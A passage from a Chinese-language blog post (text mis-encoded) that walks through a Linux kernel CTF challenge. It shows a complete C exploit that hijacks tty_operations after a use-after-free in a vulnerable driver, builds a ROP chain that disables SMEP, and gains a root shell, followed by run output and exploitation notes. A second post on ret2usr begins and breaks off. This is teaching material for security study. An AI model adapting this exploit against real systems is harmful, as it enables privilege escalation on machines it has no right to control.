class="title">tty_driver</span> *<span class="title">driver</span>;</span>  </span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span>  </span><br><span class="line">    <span class="keyword">int</span> index;  </span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span>  </span><br><span class="line">    <span class="keyword">spinlock_t</span> ctrl_lock;  </span><br><span class="line">    <span class="keyword">spinlock_t</span> flow_lock;  </span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span>  </span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">64</span>];  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span>  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;  </span><br><span class="line">    <span class="keyword">int</span> count;  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span>  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span>  </span><br><span class="line">              flow_stopped:<span class="number">1</span>,  </span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;  </span><br><span class="line">    <span class="keyword">int</span> hw_stopped;  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span>  </span><br><span class="line">              packet:<span class="number">1</span>,  </span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span>  </span><br><span class="line">    <span class="keyword">int</span> flow_change;  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span>  </span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> write_wait;  </span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> read_wait;  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span>  </span><br><span class="line">    <span class="keyword">void</span> *disc_data;  </span><br><span class="line">    <span class="keyword">void</span> *driver_data;  </span><br><span class="line">    <span class="keyword">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span>  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096  </span></span><br><span class="line">    <span class="keyword">int</span> closing;  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;  </span><br><span class="line">    <span class="keyword">int</span> write_cnt;  </span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span>  </span><br><span class="line">&#125; __randomize_layout;  </span><br></pre></td></tr></table></figure>

<p>ç„¶åæœ‰ä¸€ä¸ªç±»ä¼¼è™šè¡¨æŒ‡é’ˆ<code>const struct tty_operations *ops</code>,è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªè¿™æ ·çš„è™šè¡¨ï¼Œé‡Œé¢å‚¨å­˜äº†å¤§é‡çš„å‡½æ•°åœ°å€ï¼Œå¯ä»¥æŠŠè¿™ä¸ªè®¾å¤‡å½“æˆc+++ä¸­çš„ä¸€ä¸ªå¯¹è±¡ï¼Œå½“å¯¹è¿™ä¸ªå¯¹è±¡æ‰§è¡Œè™šå‡½æ•°çš„æ—¶å€™ä¼šä»è¿™ä¸ªè™šè¡¨ä¸­æ‰¾åˆ°å¯¹åº”å‡½æ•°çš„åœ°å€ç„¶ååœ¨æ‰§è¡Œï¼Œå¯è§æ‰§è¡Œ<code>open() read() write() close() </code>çš„æ—¶å€™éƒ½ä¼šä»è¿™ä¸ªè™šè¡¨ä¸­æ‰¾å‡½æ•°åœ°å€ï¼Œåªè¦æˆ‘ä»¬èƒ½ä¼ª<code>tty_struct</code>å°±å¯ä»¥é—´æ¥æ§åˆ¶<code>tty_operations</code>äº†ï¼Œé€šè¿‡ä¿®æ”¹è™šè¡¨ä¸­å‡½æ•°åœ°å€æ¥æ§åˆ¶ç¨‹åºæµäº†ï¼Œå…¶ä¸­write()å¤„äºty_operations[7],å½“ç¨‹åºæ‰§è¡Œè™šè¡¨å‡½æ•°çš„æ—¶å€™raxå°±æ°¸è¿œæŒ‡å‘è™šè¡¨ç¬¬ä¸€é¡¹ï¼Œæ‰€ä»¥å¯ä»¥ç»“åˆwriteå’Œraxæ¥å®Œæˆropã€‚(æ„Ÿè§‰å¾ˆåƒhouse of kiwi,éƒ½æ˜¯é€šè¿‡ä¸€ä¸ªå›ºå®šå¯„å­˜å™¨å’Œç›¸å¯¹è°ƒç”¨å®Œæˆrop)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,  </span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span>  </span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);  </span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);  </span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,  </span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);  </span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);  </span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,  </span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);  </span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,  </span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);  </span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);  </span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);  </span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);  </span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);  </span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);  </span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);  </span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,  </span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);  </span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);  </span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);  </span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,  </span><br><span class="line">                struct serial_icounter_struct *icount);  </span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL  </span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);  </span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);  </span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">    <span class="keyword">int</span> (*proc_show)(struct seq_file *, <span class="keyword">void</span> *);  </span><br><span class="line">&#125; __randomize_layout;  </span><br></pre></td></tr></table></figure>

<h2 id="0x3-è„šæœ¬"><a href="#0x3-è„šæœ¬" class="headerlink" title="0x3 è„šæœ¬"></a>0x3 è„šæœ¬</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0xffffffff810a1420</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_creds=<span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="keyword">void</span>* fake_tty_operatios[<span class="number">30</span>];</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span>&#123;</span><br><span class="line">            (*((<span class="keyword">void</span> (*)(<span class="keyword">char</span> *))commit_creds))((*((<span class="keyword">char</span>* (*)(<span class="keyword">int</span>))prepare_kernel_creds))(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">32</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    rop[i++]=<span class="number">0xffffffff810d238d</span>; <span class="comment">//pop rdi ; ret</span></span><br><span class="line">    rop[i++]=<span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++]=<span class="number">0xffffffff81004d80</span>;<span class="comment">//mov cr4, rdi ; pop rbp ; ret</span></span><br><span class="line">    rop[i++]=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=(<span class="keyword">size_t</span>)get_root;</span><br><span class="line">    rop[i++]=<span class="number">0xffffffff81063694</span>;<span class="comment">//swapgs ; pop rbp ; ret</span></span><br><span class="line">    rop[i++]=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=<span class="number">0xFFFFFFFF8181A797</span>;<span class="comment">//iretq</span></span><br><span class="line">    rop[i++]=(<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">    rop[i++]=user_cs;</span><br><span class="line">    rop[i++]=user_rflags;</span><br><span class="line">    rop[i++]=user_sp;</span><br><span class="line">    rop[i++]=user_ss;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">30</span>;i++)&#123;</span><br><span class="line">        fake_tty_operatios[i]=<span class="number">0xFFFFFFFF8181BFC5</span>;<span class="comment">////mov rsp, rax;dec ebx;ret</span></span><br><span class="line">    &#125;</span><br><span class="line">    fake_tty_operatios[<span class="number">0</span>]=<span class="number">0xffffffff810635f5</span>;<span class="comment">//pop rax; pop rbp; ret</span></span><br><span class="line">    fake_tty_operatios[<span class="number">1</span>]=(<span class="keyword">size_t</span>)rop;</span><br><span class="line">    fake_tty_operatios[<span class="number">3</span>]=<span class="number">0xFFFFFFFF8181BFC5</span>;<span class="comment">// mov rsp,rax ; dec ebx ; ret</span></span><br><span class="line">    <span class="keyword">int</span> fd1=open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2=open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line">    <span class="keyword">int</span> fd_tty=open(<span class="string">&quot;/dev/ptmx&quot;</span>,O_RDWR|O_NOCTTY);</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_struct[<span class="number">4</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd2,fake_tty_struct,<span class="number">32</span>);</span><br><span class="line">    fake_tty_struct[<span class="number">3</span>]=(<span class="keyword">size_t</span>)fake_tty_operatios;</span><br><span class="line">    write(fd2,fake_tty_struct,<span class="number">32</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    write(fd_tty,buf,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x4-æœ€ç»ˆæ•ˆæœ"><a href="#0x4-æœ€ç»ˆæ•ˆæœ" class="headerlink" title="0x4 æœ€ç»ˆæ•ˆæœ"></a>0x4 æœ€ç»ˆæ•ˆæœ</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/ $ ls</span><br><span class="line">bin      etc      flag     init     proc     sys</span><br><span class="line">da.sh    exp      gadget   lib      root     tmp</span><br><span class="line">dev      exp.c    home     linuxrc  sbin     usr</span><br><span class="line">/ $ cat flag</span><br><span class="line">cat: can&#x27;t open &#x27;flag&#x27;: Permission denied</span><br><span class="line">/ $ ./exp</span><br><span class="line">[   16.387072] device open</span><br><span class="line">[   16.388872] device open</span><br><span class="line">[   16.390499] alloc done</span><br><span class="line">[   16.392086] device release</span><br><span class="line">/ # cat flag</span><br><span class="line">falg&#123;123&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x5-æ€è€ƒ"><a href="#0x5-æ€è€ƒ" class="headerlink" title="0x5 æ€è€ƒ"></a>0x5 æ€è€ƒ</h2><p>ropå¸ƒç½®åœ¨å†…æ ¸æ€å’Œç”¨æˆ·æ€æœ‰å¾ˆå¤§çš„åŒºåˆ«ï¼Œå½“å¸ƒç½®åœ¨å†…æ ¸æ€çš„æ—¶å€™ï¼Œå¦‚æœç»„æˆropçš„gadgetå…¨æ˜¯å†…æ ¸gadgetçš„æ—¶å€™ï¼Œå°±ä¸ä¼šè§¦å‘semepå’Œsmapï¼Œä½†æ˜¯å¦‚æœå¸ƒç½®åœ¨ç”¨æˆ·æ€çš„æ—¶å€™ï¼Œå°±ç®—å…¨éƒ¨æ˜¯å†…æ ¸æ€çš„gadget,ä¹Ÿä¼šè§¦å‘smap,å› ä¸ºæ¯æ¬¡retçš„æ—¶å€™éƒ½ä¼šè®¿é—®ç”¨æˆ·æ€æ•°æ®æ‹¿åˆ°åœ°å€ï¼Œå°±è§¦å‘smapäº†ï¼Œè‡³äºä¸ºä»€ä¹ˆä¸è§¦å‘smep,å› ä¸ºå…¨ç¨‹éƒ½æ²¡æœ‰æ‰§è¡Œç”¨æˆ·æ€ä»£ç ã€‚</p>
<h2 id="0x6-æ€»ç»“"><a href="#0x6-æ€»ç»“" class="headerlink" title="0x6 æ€»ç»“"></a>0x6 æ€»ç»“</h2><p><strong>iretq</strong>:æŒ‡ä»¤åˆ™ç”¨æ¥æ¢å¤ç”¨æˆ·æ€çš„ csã€ssã€rspã€ripã€rflagsï¼Œæ¢å¤çš„æ—¶å€™çš„å¸ƒå±€å¦‚ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+-----------+</span><br><span class="line">|Â Â Â Â RIPÂ Â Â Â |</span><br><span class="line">+-----------+</span><br><span class="line">|Â Â Â Â CSÂ Â Â Â Â |</span><br><span class="line">+-----------+</span><br><span class="line">|Â Â Â rflagsÂ Â |</span><br><span class="line">+-----------+</span><br><span class="line">|Â Â Â Â RSPÂ Â Â Â |</span><br><span class="line">+-----------+</span><br><span class="line">|Â Â Â Â SSÂ Â Â Â Â |</span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure>

<p>å¯è§è¿™æ¡æŒ‡ä»¤ä¼šç›´æ¥æ”¹å˜ripçš„å€¼ï¼Œå½“è¿™æ¡æŒ‡ä»¤æ‰§è¡Œå®Œä¹‹åä¼šå»æ‰§è¡Œripå¤„çš„æŒ‡ä»¤ï¼Œå‡å¦‚ripå¤„æ˜¯get_shellçš„å‡½æ•°åœ°å€ï¼Œè¿™æ¡æŒ‡ä»¤å®Œå°±ç›´æ¥æ‰§è¡Œget_shellå‡½æ•°äº†ï¼Œæ‰€ä»¥ä¸ç”¨<code>iretq;ret</code>ï¼Œç›´æ¥<code>iretq</code>å°±å¯ä»¥è¿”å›ç”¨æˆ·æ€å¹¶æ‰§è¡Œget_shelläº†ã€‚</p>
<p><strong>gadget</strong>:ä½¿ç”¨ropperå¯»æ‰¾gadgetæ˜¯æœ€åˆé€‚çš„ã€‚</p>
<p><strong>å‡½æ•°åç§»é‡</strong>:æ¯”å¦‚è¿™é“é¢˜è§£å‡ºæ¥çš„vmlinuxå¥½åƒæ²¡æœ‰ç¬¦å·è¡¨ï¼Œæ‰€ä»¥æ— æ³•é€šè¿‡pwnç›´æ¥å¾—åˆ°åç§»é‡ï¼Œè¿™æ—¶å¯ä»¥è®©å†…æ ¸è¿è¡Œèµ·æ¥ï¼Œç„¶åé€šè¿‡è¿™è¡Œshellå¾—åˆ°æŸä¸ªå†…æ ¸å‡½æ•°çš„åœ°å€ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms|grep &quot;xxxx&quot;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/12/ret2user/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/12/ret2user/" class="post-title-link" itemprop="url">ret2user</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-03-12 01:59:09 / ä¿®æ”¹æ—¶é—´ï¼š02:01:40" itemprop="dateCreated datePublished" datetime="2022-03-12T01:59:09+08:00">2022-03-12</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h1><p>å¤è€çš„æ‰‹æ³•ï¼Œä¸€èˆ¬æ˜¯åœ¨æ²¡å¼€sempçš„æƒ…å†µä¸‹ï¼Œç”¨æˆ·ç©ºé—´ä¸èƒ½è®¿é—®å†…æ ¸æ€ï¼Œå†…æ ¸æ€å¯ä»¥ç›´æ¥æ‰§è¡Œå†…æ ¸æ€çš„ä»£ç ï¼Œæ‰€ä»¥å¯ä»¥åœ¨ç”¨æˆ·æ€å†™ä¸Šææƒä»£ç ï¼Œç„¶åå†…æ ¸æ€è®¿é—®è¿™æ®µä»£ç ï¼Œæœ€åè¿”å›ç”¨æˆ·æ€æ‰§è¡Œæ‰§è¡Œsystem(â€œ/bin/shâ€);</p>
<p>æ³¨æ„ä¸è¦ç›´æ¥åœ¨å†…æ ¸æ€æ‰§è¡Œsystem(â€œ/bin/shâ€)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span 